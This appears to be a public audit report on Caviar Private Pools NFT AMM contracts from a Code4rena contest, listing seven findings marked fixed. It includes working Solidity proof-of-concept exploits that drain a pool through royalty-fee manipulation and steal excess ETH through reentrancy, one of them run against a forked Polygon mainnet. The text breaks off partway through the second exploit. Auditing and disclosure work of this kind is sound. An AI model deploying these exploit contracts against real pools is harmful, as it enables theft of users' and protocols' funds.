# About the Audit
This security review was conducted as an involvement in a public and open-source competition hosted by code4arena & Caviar. 
The team's efforts in securing the project managed to earn a 6th place finish, identifying several High & Medium vulnerabilities.

The auditing team is known as Voyvoda and includes 3 Blockchain Security Experts
* alexxander $~~~~~~$ | twitter: https://twitter.com/__alexxander_
* deadrosesxyz $~$ | twitter: https://twitter.com/deadrosesxyz
* gogotheauditor | twitter: https://twitter.com/gogotheauditor
  
# About Caviar Private Pools
Caviar Private Pools are highly customizable NFT AMM pool implementing concentrated liquidity.
 
The audit focused on veryfiying and securing all of the contracts in the system. 

# Findings List
| # | Issue Title                                                                                | Severity | Status |
| ------ | ----------------------------------------------------------------- | --------------    | ------------------|
| [[1]](#my-section1) | Royalty receiver can drain a private pool                                | High     | Fixed  |
| [[2]](#my-section2) | PrivatePool owner can steal tokens approved to the pair                  | High     | Fixed  |
| [[3]](#my-section3) | Incorrect protocol fee is taken when changing NFTs                       | Medium   | Fixed  |
| [[4]](#my-section4) | Incorrect NFT sale price calculation                                     | Medium   | Fixed  |
| [[5]](#my-section5) | Non-standard ERC20 tokens such as USDT are not supported                 | Medium   | Fixed  |
| [[6]](#my-section6) | Malicious royalty recipient can steal excess eth from buy orders         | Medium   | Fixed  |
| [[7]](#my-section7) | `change(...)` in `EthRouter.sol` won't work with multiple Change orders  | Medium   | Fixed  |

# Detailed Explanation

## <a id="my-section1"></a> 1. Royalty receiver can drain a private pool
### Severity
High
### Impact
Royalty fee calculation has a serious flaw in `buy(...)`. Caviar's private pools could be completely drained.
### Vulnerable Code
[line1](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L252)
[line2](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L267-L268)
[line3](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L274)
### Description
In the Caviar private pool, NFT royalties are being paid from the msg.sender to the NFT royalty receiver of each token in `PrivatePool.buy()` and `PrivatePool.sell()`.

In both functions, the amount needed to pay all royalties is taken from the `msg.sender` who is either the buyer or the seller depending on the context. In `PrivatePool.sell`, this amount is first paid by the pool and then taken from the `msg.sender` by simply reducing what they receive in return for the NFTs they are selling. A similar thing is done in `PrivatePool.buy`, but instead of reducing the output amount, the input amount of base tokens that the `msg.sender` (buyer) should pay to the pool is increased:

```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

251:    // add the royalty fee amount to the net input aount
252:    netInputAmount += royaltyFeeAmount;
```
```solidity
        #sell(uint256[],uint256[],MerkleMultiProof,IStolenNftOracle.Message[])

354:    // subtract the royalty fee amount from the net output amount
355:    netOutputAmount -= royaltyFeeAmount;
```
The difference between these two functions (that lies at the core of the problem) is that in `PrivatePool.buy`, the `_getRoyalty()` function is called twice. The first time is to calculate the total amount of royalties to be paid, and the second time is to actually send each royalty fee to each recipient:
```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

242:    if (payRoyalties) {
243:        // get the royalty fee for the NFT
244:        (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice); // @audit _getRoyalty called 1st time
245:
246:        // add the royalty fee to the total royalty fee amount
247:        royaltyFeeAmount += royaltyFee;
248:    }
        
        ...
        
273:    // get the royalty fee for the NFT
274:    (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice); // @audit  _getRoyalty called 2nd time
```
This is problematic because an attacker could potentially change the royalty fee between the two calls, due to the following untrusted external call:
```solidity
        #buy(uint256[],uint256[],MerkleMultiProof)

267:    // refund any excess ETH to the caller
268:    if (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount); // @audit untrusted external call
```
If the `msg.sender` is a malicious contract that has control over the `royaltyFee` for the NFTs that are being bought, they can change it, for example, from 0 basis points (0%) to 10000 basis points (100%) in their `receive()` function.
```solidity
        // @audit An attacker can call this setter function between the two `_getRoyalty()` calls.
94:     function _setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) internal virtual {
95:         require(feeNumerator <= _feeDenominator(), "ERC2981: royalty fee will exceed salePrice");
96:         require(receiver != address(0), "ERC2981: Invalid parameters");
97:
98:         _tokenRoyaltyInfo[tokenId] = RoyaltyInfo(receiver, feeNumerator);
99:     }
```
That way, the amount transferred by the `msg.sender` for royalties will be 0 because the total `royaltyFeeAmount` is calculated based on the first value (0%) but the actual sent amount to the receiver is determined by the second value (100%). This will result in the whole price paid for the NFT being returned to the royalty receiver, but being paid by the Pool instead of the msg.sender.

The `msg.sender` has therefore received the NFT but paid the whole price for it to the royalty receiver and 0 to the Pool. If the `msg.sende`r is the royalty receiver, they will basically have spent 0 base tokens (not counting gas expenses) but received the NFT in their account. They can then sell it to the same private pool to exchange it for base tokens.

This is an extreme scenario, however, the developers have acknowledged ERC-2981 and that `royaltyInfo(...)` returns an arbitrary address. In the future we could see projects that have royalty payments that fluctuate such as increasing/decaying royalties over time article on eip 2981 or projects that delegate the creation of nfts to the users such as 1024pixels polygon, git repo and royalties are paid to each user rather to a single creator. In such cases invocation of `_getRoyalty(...)` twice with external calls that transfer assets in-between is a vulnerable pattern that is sure to introduce asset risks and calculation inaccuracies both for the users and protocol itself. Immediate remedy would be to simplify `buy(...)` in `PrivatePool.sol` to use only one for loop and call `_getRoyalty(...)` once.

PoC shows how the entire Pool's base tokens can be drained by a single royalty receiver using a single NFT assuming that the royalty receiver has control over the `royaltyFee`.

### Coded POC
Place the following test in `2023-04-caviar/test`.

Run `forge test --ffi -m test_MaliciousRoyaltyReceiverDrainPrivatePool -vv`.

The expected output in the terminal is:
```solidity
  ==========================================
   Before the exploit
  ==========================================
   | Attacker balance:            100.0 ETH
   | Pool balance:                100.0 ETH
  ==========================================
  
  ==========================================
   After the exploit
  ==========================================
   | Attacker balance:            199.9 ETH
   | Pool balance:                0.1 ETH
  ==========================================
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC721Royalty, ERC721} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol";

import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

import {Fixture} from "./Fixture.sol";
import {PrivatePool} from "../src/PrivatePool.sol";
import {IStolenNftOracle} from "../src/interfaces/IStolenNftOracle.sol";

import "forge-std/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

/**
 * @title Mock NFT collection contract.
 * @notice This contract follows the EIP721 and EIP2981 standards.
 * @dev Inherits OpenZeppelin's contracts.
 */
contract ERC721RoyaltyCollection is Ownable, ERC721Royalty {
    /// @notice Counter variable for token IDs.
    uint256 public tokenId;

    /**
     * @dev Ownership is given to the deployer (msg.sender).
     * @param _name ERC721 name property.
     * @param _symbol ERC721 symbol property.
     */
    constructor(
        string memory _name,
        string memory _symbol
    ) ERC721(_name, _symbol) {}

    modifier onlyRoyaltyReceiver(uint256 _tokenId) {
        (address receiver, ) = royaltyInfo(_tokenId, 0);
        require(msg.sender == receiver);
        _;
    }

    /**
     * @notice Mints an NFT and sets information regarding royalties.
     * @notice Each NFT costs 1 ETH to mint and the funds go to the DAO behind the project.
     * @param _to The account that the NFT will be minted to.
     * @param _royaltyReceiver The receiver of any royalties paid per each sale.
     * @param _royaltyFeeNumerator The fee percentage in basis points that represents
     * how much of each sale will be transferred to the royalty receiver.
     */
    function mint(
        address _to,
        address _royaltyReceiver,
        uint96 _royaltyFeeNumerator
    ) external payable {
        require(msg.value == 1 ether);
        _mint(_to, tokenId);
        _setTokenRoyalty(tokenId++, _royaltyReceiver, _royaltyFeeNumerator);
    }

    /**
     * @notice Only the current royalty receiver is allowed to
     * determine the new receiver address and the new fee percentage.
     * @param _tokenId The token whose royalty data will be changed.
     * @param _royaltyReceiver The new royalty receiver address (can remain the same).
     * @param _royaltyFeeNumerator The new royalty fee basis points (can remain the same).
     */
    function setTokenRoyalty(
        uint256 _tokenId,
        address _royaltyReceiver,
        uint96 _royaltyFeeNumerator
    ) external onlyRoyaltyReceiver(_tokenId) {
        _setTokenRoyalty(_tokenId, _royaltyReceiver, _royaltyFeeNumerator);
    }

    /**
     * @notice Withdraw all revenue from the NFT sales.
     * @dev This function is only callable by the owner/DAO behind the project.
     */
    function withdraw() external onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}

/**
 * @title AttackerContract.
 * @notice The main logic for exploiting the vulnerability in PrivatePool.sol.
 */
contract AttackerContract is Ownable, ERC721TokenReceiver {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721RoyaltyCollection public nft;

    /// @notice The Caviar private pool that incorrectly calculates royalties.
    PrivatePool public vulnerablePrivatePool;

    /// @notice The target token ID that will be used to perform the exploit.
    uint256 public tokenId;

    /// @notice Needed to reset state after attack is performed.
    uint256 public originalFee;

    /// @notice Helper flags needed to navigate the attack path in the receive() function.
    bool public f1;
    bool public f2;

    /**
     * @param _vulnerablePrivatePool The address of the targeted Caviar private pool.
     * @param _nft The NFT collection address.
     * @param _tokenId The specific NFT that will be used for the exploit.
     */
    constructor(
        address payable _vulnerablePrivatePool,
        address _nft,
        uint256 _tokenId
    ) {
        nft = ERC721RoyaltyCollection(_nft);
        vulnerablePrivatePool = PrivatePool(_vulnerablePrivatePool);

        tokenId = _tokenId;
    }

    /**
     * @notice Executes the attack. Drains the base token balance of the private pool and sends it to the owner.
     * @param iterations How many times to perform the attack in order to drain the entire base token balance of the pool.
     * @param tokenIds An array including only the tokenId that will be used to perform the attack.
     * @param tokenWeights Empty array if the merkle root is bytes32(0).
     * @param proof Empty if the merkle root is bytes32(0).
     */
    function attack(
        uint256 iterations,
        uint256[] calldata tokenIds,
        uint256[] calldata tokenWeights,
        PrivatePool.MerkleMultiProof calldata proof
    ) external payable onlyOwner {
        // Execute attack.
        for (uint256 i; i < iterations; i++) {
            vulnerablePrivatePool.buy{value: msg.value}(
                tokenIds,
                tokenWeights,
                proof
            );
        }

        // Return all assets to the owner/original receiver.
        (bool success, ) = payable(owner()).call{value: address(this).balance}(
            ""
        );

        // Ensure the call was successful.
        require(success);
    }

    /**
     * @notice Main logic for the exploit.
     */
    receive() external payable {
        // Do not allow arbitrary calls.
        require(msg.sender == address(vulnerablePrivatePool));

        // Return if the call comes from PrivatePool.sell().
        if (f2) return;

        // We should enter the next block only if the call
        // comes from the ETH excess refund in PrivatePool.buy().
        if (!f1) {
            // Do not enter again for this iteration.
            f1 = true;

            // Cache the original fee in order to reset it later.
            (, originalFee) = nft.royaltyInfo(tokenId, 10_000);

            // Increase the royalty fee significantly to get back the price we paid for buying it.
            nft.setTokenRoyalty(tokenId, address(this), 10_000);

            // Return to PrivatePool.buy().
            return;
        }

        // Reset the fee.
        nft.setTokenRoyalty(tokenId, address(this), uint96(originalFee));

        // Set the second flag used to not execute any logic if the call comes from PrivatePool.sell().
        f2 = true;

        // Approve the bought NFT to the Caviar private pool.
        nft.approve(address(vulnerablePrivatePool), tokenId);

        // Sell the bought NFT in order to extract base tokens from the vulnerable private pool.
        vulnerablePrivatePool.sell(
            new uint256[](1),
            new uint256[](0),
            PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),
            new IStolenNftOracle.Message[](0)
        );

        // Reset state variables so attack can be performed one more iteration.
        delete originalFee;
        delete f1;
        delete f2;
    }
}

contract MaliciousRoyaltyReceiverDrainPrivatePoolTest is Fixture {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721RoyaltyCollection public nft;

    /// @notice The Caviar private pool that incorrectly calculates royalties.
    PrivatePool public privatePool;

    /// @notice Merkle root is set to bytes32(0) to make setup simpler.
    bytes32 constant MERKLE_ROOT = bytes32(0);

    /// @notice The private pool has initial balance/reserve of 100 ETH (the base token is address(0)).
    uint128 constant VIRTUAL_BASE_TOKEN_RESERVES = 100e18;

    /// @notice The private pool has 5 NFTs, each one with a wight of 1e18 (the merkle root is bytes32(0)).
    uint128 constant VIRTUAL_NFT_RESERVES = 5e18;

    /// @notice The specific NFT that will be used to perform the epxloit.
    /// @notice The attacker should be the royalty receiver of this NFT.
    /// @dev Zero is used so we can pass `new uint256[](1)` as the tokenIds array.
    uint256 tokenId = 0;

    // The attacker. It is set as a royalty receiver to NFT#tokenId that will be used to perform the exploit.
    address receiver;

    function setUp() external {
        // The attacker.
        receiver = vm.addr(1);

        // The NFT collection the will be used by the private pool.
        nft = new ERC721RoyaltyCollection("VoyvodaSec", "VSC");

        _deployPrivatePool();
        _depositNFTs(tokenId);

        _fundEth();

        // Assert setup.
        assertEq(
            privatePool.nft(),
            address(nft),
            "Setup: NFT collection not set correctly."
        );
        assertEq(
            nft.ownerOf(tokenId),
            address(privatePool),
            "Setup: the NFT should initially be deposited to the private pool."
        );

        assertEq(
            privatePool.baseToken(),
            address(0),
            "Setup: the private pool base token should be ETH."
        );
        assertEq(
            address(privatePool).balance,
            VIRTUAL_BASE_TOKEN_RESERVES,
            "Setup: incorrect initial amount of ETH supplied to pool."
        );

        // Log initial state (before attack).
        _logState(" Before the exploit");
    }

    function test_MaliciousRoyaltyReceiverDrainPrivatePool() external {
        // 0. Execute the following steps from the royalty receiver (the attacker) account.
        vm.startPrank(receiver);

        // 1. Deploy the attacker contract that contains the main exploit logic.
        AttackerContract maliciousReceiverContract = new AttackerContract(
            payable(privatePool),
            address(nft),
            tokenId
        );

        assertEq(maliciousReceiverContract.owner(), receiver);

        // 2. Change the royalty receiver for NFT#tokenId to the attacker contract.
        nft.setTokenRoyalty(tokenId, address(maliciousReceiverContract), 10);

        (address newRoyaltyReceiver, ) = nft.royaltyInfo(tokenId, 10_000);
        assertEq(newRoyaltyReceiver, address(maliciousReceiverContract));

        // 3. Execute the attack.
        maliciousReceiverContract.attack{value: 100 ether}(
            4, // 4 iterations are needed to drain the whole private ETH balance having the current setup.
            new uint256[](1), // This will pass the following array as tokenIds - [0].
            new uint256[](0),
            PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))
        );

        // Log state after pool was drained.
        _logState(" After the exploit");
    }

    // ======================================= Helpers ======================================= //

    /**
     * @notice Deploy and initialize an instance of the vulnerable private pool implementation.
     */
    function _deployPrivatePool() internal {
        // Deploy pool implementation.
        privatePool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(stolenNftOracle)
        );

        // Initialize pool instance.
        privatePool.initialize(
            address(0),
            address(nft),
            VIRTUAL_BASE_TOKEN_RESERVES,
            VIRTUAL_NFT_RESERVES,
            0,
            0,
            MERKLE_ROOT,
            false,
            true
        );
    }

    /**
     * @notice Simulates deposits of 5 NFTs to the private pool.
     * @param _targetTokenId The specific NFT that will be
     * used by the attacker to perform the exploit.
     */
    function _depositNFTs(uint256 _targetTokenId) internal {
        for (uint256 i = 0; i < 5; i++) {
            // Mint NFTs directly to the Pool to make setup easier.
            nft.mint{value: 1 ether}(
                address(privatePool),
                i == _targetTokenId ? receiver : vm.addr(type(uint64).max), // Set the attacker/royalty receiver account to the passed token only.
                uint96(10)
            );
        }
    }

    /**
     * @notice Funds ETH to the accounts that will need native tokens for this test case.
     */
    function _fundEth() internal {
        vm.deal(address(privatePool), VIRTUAL_BASE_TOKEN_RESERVES);
        vm.deal(receiver, 100e18);
    }

    /**
     * @notice Logs the current state to show the exploit status in the terminal.
     */
    function _logState(string memory state) internal view {
        console.log("");
        console.log("==========================================");
        console.log(state);
        console.log("==========================================");
        console.log(
            string.concat(
                " | Attacker balance:            ",
                string.concat(
                    Strings.toString(receiver.balance / 1e18),
                    ".",
                    Strings.toString((receiver.balance % 1e18) / 1e17)
                ),
                " ETH"
            )
        );
        console.log(
            string.concat(
                " | Pool balance:                ",
                string.concat(
                    Strings.toString(address(privatePool).balance / 1e18),
                    ".",
                    Strings.toString(
                        (address(privatePool).balance % 1e18) / 1e17
                    )
                ),
                " ETH"
            )
        );
        console.log("==========================================");
    }
}
```
### Recommendation
Ensure that the amount sent to the NFT royalty receivers in the second for loop in `buy()` is the same as the amount calculated in the first for loop.

## <a id="my-section2"></a> 2.PrivatePool owner can steal tokens approved to the pair
### Severity
High
### Impact
User's balance of base tokens can be stolen via the well known "max approve" vulnerability or by front-running approvals.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L454-L476)
### Description
The pair contract can be used directly to execute `buy()` operations. In order to buy an NFT from a PrivatePool that has an ERC20 base token, users have to approve the PrivatePool to spend these tokens.

A well known problem is when users decide to approve a given contract to spend all their assets or forget to reset approvals after a transfer that did not transfer the whole approved amount of tokens. This can be exploited by the owner of the PrivatePool in several ways:

* Using the execute function at any point in time, the owner of the private pool can steal any tokens that belong to accounts that have used to approve some amount of base token to this contract. The owner is heavily incentivised in this case as the amount to steal can be really big.

* Front-running a call to the `.buy` function (and back-running the `baseToken.approve` call) executing the same operation mentioned in 1. using the execute function. Again the owner of the private pool is incentivised if the approved quantity is big (e.g. `type(uint256).max`) and the balance of base tokens of the `msg.sender` is also big enough.

* Front-running a call to the .buy function (and back-running the `baseToken.approve` call) by calling `setVirtualReserves` or `setMerkleRoot` setting the parameters in such a way that will highly inflate the `netInputAmount`.

### Recommendation
Using a Timelock could solve the listed problems.

## <a id="my-section3"></a> 3. Incorrect protocol fee is taken when changing NFTs
### Severity
Medium
### Impact
Incorrect protocol fee is taken when changing NFTs which results in profit loss for the Caviar protocol.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L737)
### Description
The protocol fee in `changeFeeQuote` is calculated as a percentage of the `feeAmount` which is based on the input amount:
```solidity
function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {
    ...
    protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;
```
This seems wrong as in `buyQuote` and `sellQuote` the protocol fee is calculated as a percentage of the input amount, not the pool fee amount:
```solidity
function buyQuote(uint256 outputAmount)
    ...
    protocolFeeAmount = inputAmount * Factory(factory).protocolFeeRate() / 10_000;
```
```solidity
function sellQuote(uint256 inputAmount)
    ...
    protocolFeeAmount = outputAmount * Factory(factory).protocolFeeRate() / 10_000;
```
This makes the protocol fee extremely low meaning a profit loss for the protocol.

### Recommendation
`protocolFeeAmount` in `changeFeeQuote` should be a percentage of the input amount instead of the pool fee.

## <a id="my-section4"></a> 4. Incorrect NFT sale price calculation
### Severity
Medium
### Impact
Royalty receivers of NFTs with different weight/prices will receive incorrect royalty fee amount.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L235-L236)
[link2](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L334-L335)
### Description
Incorrect assumption is made that the royalty receiver of each NFT that is being sold/bought will be the same and therefore the sale price of each NFT could be calculated as the average of all.
```solidity
235:    // calculate the sale price (assume it's the same for each NFT even if weights differ)
236:    uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;
```

```solidity
334:    // calculate the sale price (assume it's the same for each NFT even if weights differ)
335:    uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount) / tokenIds.length;
```
This is incorrect since the `salePrice` is used to calculate the royalty fee that will be paid to each different royalty receiver for each specific NFT in `buy()` and `sell()`:
```solidity
272:    for (uint256 i = 0; i < tokenIds.length; i++) {
273:        // get the royalty fee for the NFT
274:        (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);
```
```solidity
338:    (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);
```
Therefore if 2 NFTs are bought, NFT#1 has a weight of 10e18, NFT#2 has a weight of 100e18 and the msg.sender is paying 110 ETH for these two NFTs, the salePrice will be calculated as 55 ETH for each NFT (ignoring fees) and therefore the royalty fee will be 5.5 ETH for each NFT (if the royalty fee is 10%) while it should be 1 ETH for NFT#1 and 10 ETH for NFT#2.
```solidity
        /**
         * @dev Sets the royalty information for a specific token id, overriding the global default.
         *
         * Requirements:
         *
         * - `receiver` cannot be the zero address.
         * - `feeNumerator` cannot be greater than the fee denominator.
         */
        function _setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) internal virtual {
            require(feeNumerator <= _feeDenominator(), "ERC2981: royalty fee will exceed salePrice");
            require(receiver != address(0), "ERC2981: Invalid parameters");

            _tokenRoyaltyInfo[tokenId] = RoyaltyInfo(receiver, feeNumerator);
        }
```
OpenZeppelin's implementation of ERC2981 shows how there can be different royalty receiver and fee for each specific token Id:
### Recommendation
Include the weight of the NFT when calculating the sale price. Do not assume that the royalty receiver for each NFT will be the same.

## <a id="my-section5"></a> 5. Non-standard ERC20 tokens such as USDT are not supported
### Severity
Medium
### Impact
Well-known issue regarding non-standard ERC20 tokens such as USDT that don't implement the EIP20 interface correct because of missing return boolean variables on methods like `transfer()`, `transferFrom()` and `approve()`.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L115)
### Description
Creating a PrivatePool with a token like USDT will revert because of the following line:
```solidity
115:      ERC20(_baseToken).transferFrom(msg.sender, address(privatePool), baseTokenAmount);
```
Since USDT does not return a boolean when `.transferFrom` is called, but the ERC20 interface used defines that there will be a boolean returned, the compiler will check whether the `returndatasize()` is 32 bytes (one word size) and revert if this is not true.

The same issue occures on all other places where `.transferFrom` and `.transfer` are used instead of the corresponding methods from `SafeTransferLib`. But since this issue appears in the Factory contract and stops the anyone from creating a PrivatePool with such base token there are no funds at risk, but a core functionallity of the project is affected when the most popular stablecoin is used.
### Recommendation
Use OpenZeppelin's SafeTransferLib methods instead of the standard IERC20 interface for executing transfers.

## <a id="my-section6"></a> 6.  Malicious royalty recipient can steal excess eth from buy orders
### Severity
Medium
### Impact
Users that submit single or bulk `Buy` orders through `EthRouter.sol` can have their excess `eth` stolen by a malicious royalty recipient
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L268)
[link2](https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L140-L143)
### Description
The `buy(...)` function in `PrivatePool.sol` refunds excess ether back to EthRouter.sol and then pays a royalty amount to a royalty recipient. The order is the following:
```solidity
// refund any excess ETH to the caller
if (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount);

if (payRoyalties) {
    ...
else {
    recipient.safeTransferETH(royaltyFee);
}
```
This turns out to be dangerous since now `buy(...)` in `EthRouter.sol` can be reentered from the fallback function of a royalty recipient. In the fallback function the attacker would call buy in the `EthRouter.sol` with an empty `Buy[] buys` calldata, `deadline=0` and `payRoyalties = false` which will skip the for loop in `buy(...)`, since `buys` is empty, and would reach the following block of code:
```solidity
// refund any surplus ETH to the caller
if (address(this).balance > 0) {
    msg.sender.safeTransferETH(address(this).balance);
}
```
Since now msg.sender is the royalty recipient he would receive all the ether that is currently residing in EthRouter.sol while the original buy(...) triggered by the user hasn't yet finished.

This issue can be more easily reproduced by assuming that the malicious royalty
recipient would come either from a single `Buy` order consisting of a single `tokenId` or multiple `Buy` orders where the `tokenId` with the malicious royalty recipient is the last `tokenId` in the array of the last `Buy` order. In the case of the `tokenId` associated with the malicious royalty recipient being positioned NOT in last place in the `tokenIds[]` array in the last `Buy` order we would have to write a `fallback` function that after collecting all the ether in `EthRouter.sol` extracts information of how much ether would be needed to successfully complete the rest of the `buy(...)` invocations (that will be called on the rest of the `tokenIds[]`) and sends that ether back to `EthRouter.sol` so that the whole transaction doesn't revert due to `EthRouter.sol` being out of funds. In the presented PoC implementation it is assumed that `tokenIds` has a single token or the malicious royalty recipient is associated with the last `tokenId` in the last `Buy` if there are multiple `Buy` orders. In the case where `tokenId` is positioned not in last place a more sophisticated approach would be needed to steal the excess eth that involves inspecting the `EthRouter.buy(...)` while it resides in the transaction mempool and front-running a transaction that configures a `fallback()` function in the royalty recipient that would send the necessary amount of the stolen excess eth back to `EthRouter.sol` so that `buy(...)` doesn't revert.
### Coded POC
Place the following test in `2023-04-caviar/test`.

Run `forge test --ffi --fork-url <polygon-mainnet-rpc-url> --fork-block-number 39900000 -m test_RoyaltyReceiverStealExcessEth -vv`.

The expected output in the terminal is:

```solidity
  ============================================
   Before exploit
  ============================================
   | Attacker balance:            100.0 ETH
   | Victim balance:              100.0 ETH
   | Router balance:              0.0 ETH
   | Pool balance:                100.0 ETH
  ============================================
  
  ============================================
   After exploit
  ============================================
   | Attacker balance:            110.625 ETH
   | Victim balance:              64.375 ETH
   | Router balance:              0.0 ETH
   | Pool balance:                125.0 ETH
  ============================================
  
  ============================================
   Data
  ============================================
   | Amount ETH paid for NFT:     25.0 ETH
   | Royalty paid to receiver:    0.625 ETH
   | Stolen excess ETH:           10.0 ETH
  ============================================
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC721Royalty} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721Royalty.sol";

import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

import "./Fixture.sol";

/**
 * @notice Needed functions interface of the ERC2981 NFT contract that we will use for this PoC.
 * @dev https://polygonscan.com/address/0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53#code
 */
interface IPixels {
    function creatorOf(uint256) external view returns (address);

    function setCreatorRedirect(address to) external;
}

/**
 * @title AttackerContract.
 * @notice The main logic for exploiting the vulnerability in PrivatePool.sol.
 */
contract MaliciousRoyaltyReceiver is Ownable, ERC721TokenReceiver {
    /// @notice The on-chain NFT collection contract that we will use for this PoC.
    ERC721Royalty nft;

    /// @notice the Caviar EthRouter contract.
    EthRouter router;

    /**
     * @param _nft The on-chain NFT collection contract that we will use for this PoC.
     * @param _router the Caviar EthRouter contract.
     */
    constructor(address _nft, address _router) {
        nft = ERC721Royalty(_nft);
        router = EthRouter(payable(_router));
    }

    /// @notice Used to perform cross contract re-entrancy and steal excess funds from victim users.
    receive() external payable {
        // This will steal all excess tokens that are currently transferred back to the pool.
        router.buy(new EthRouter.Buy[](0), 0, false);

        // Transfer the stolen amount to the owner/exploiter.
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success);
    }
}

contract RoyaltyReceiverStealExcessEthTest is Fixture {
    /// @notice The NFT collection contract that is used by the private pool.
    ERC721Royalty public nft;

    /// @notice The vulnerable Caviar private pool.
    PrivatePool public privatePool;

    /// @notice Merkle root is set to bytes32(0) to make setup simpler.
    bytes32 constant MERKLE_ROOT = bytes32(0);

    /// @notice The private pool has initial balance/reserve of 100 ETH (the base token is address(0)).
    uint128 constant VIRTUAL_BASE_TOKEN_RESERVES = 100e18;

    /// @notice The private pool has 5 NFTs, each one with a wight of 1e18 (the merkle root is bytes32(0)).
    uint128 constant VIRTUAL_NFT_RESERVES = 5e18;

    /// @notice The excess amount of ETH that the buyer/victim will send because they believe that it will be returned to them.
    uint256 constant EXCESS = 10e18;

    /// @notice The attacker contract.
    MaliciousRoyaltyReceiver public maliciousRoyaltyReceiver;

    /// @notice Common state variables.
    uint256 public tokenId;
    address public attacker;
    address public victim;

    function setUp() public {
        // Get a reference to an ERC2981 collection on polygon mainnet.
        nft = ERC721Royalty(0x1024Accd05Fa01AdbB74502DBDdd8e430d610c53);

        // Pick an NFT token id that will be used to perform the attack.
        tokenId = 61039189399824080078548987048376199044334241070534370230028874880716994294049;

        _deployPrivatePool();

        // Deposit the NFT to the pool.
        _depositNft(tokenId);

        // Get need addresses.
        attacker = IPixels(address(nft)).creatorOf(tokenId);
        victim = vm.addr(0x1234);

        // Deploy the attacker contract.
        vm.startPrank(attacker);
        maliciousRoyaltyReceiver = new MaliciousRoyaltyReceiver(
            address(nft),
            address(ethRouter)
        );

        // Set the attacker contract as the royalty receiver for NFT#tokenId.
        // Note that creators can set the royalty receiver, but can also simply mint NFTs
        // from contracts that could have malicious fallback() and wouldn't need to use
        // setCreatorRedirect since the contract that minted the nft will alredy be royalty
        // recipient.
        IPixels(address(nft)).setCreatorRedirect(
            address(maliciousRoyaltyReceiver)
        );
        vm.stopPrank();

        // Deal ETH.
        _fundEth();
    }

    function test_RoyaltyReceiverStealExcessEth() public {
        _logState(" Before exploit");

        // Get needed data for buy and logs.
        (EthRouter.Buy[] memory buys, uint256 royalty) = _getBuysStructArray();

        // Victim balance before buy order.
        uint256 victimBalanceBefore = victim.balance;

        // Purchase amount = baseTokenAmout + royalty -> royalty already included in setup
        uint256 purchaseAmount = buys[0].baseTokenAmount;

        // Expected balance of victim after purchase.
        uint256 expectedVictimBalanceAfter = victimBalanceBefore -
            purchaseAmount;

        // Execute the buy from the victim account.
        vm.prank(victim);
        ethRouter.buy{value: buys[0].baseTokenAmount + EXCESS}(buys, 0, false);

        // Calculate the amount of stolen excess ETH.
        uint256 excessAmountLost = expectedVictimBalanceAfter - victim.balance;

        _logState(" After exploit");
        _logExtraData(buys[0].baseTokenAmount, royalty, excessAmountLost);

        // Test case that excess_amount_lost is not 0 and is equal to the excess in ethRouter.buy()
        assertEq(excessAmountLost, EXCESS, "Excess eth is not sent");
    }

    // ======================================= Helpers ======================================= //

    /**
     * @return buys The array expected from EthRouter.buy to execute the buy operation.
     * @return royalty The calculated royalty amount that will be paid to the receiver.
     */
    function _getBuysStructArray()
        internal
        view
        returns (EthRouter.Buy[] memory buys, uint256 royalty)
    {
        // Add nft id.
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        // Calculate total amount to be paid.
        (uint256 baseTokenAmount, uint256 fee1, uint256 fee2) = privatePool
            .buyQuote(tokenIds.length * 1e18);

        // NFT's sale price is excluding the fees.
        uint256 salePrice = baseTokenAmount - fee1 - fee2;

        // Retrieve the royalty that will be paid.
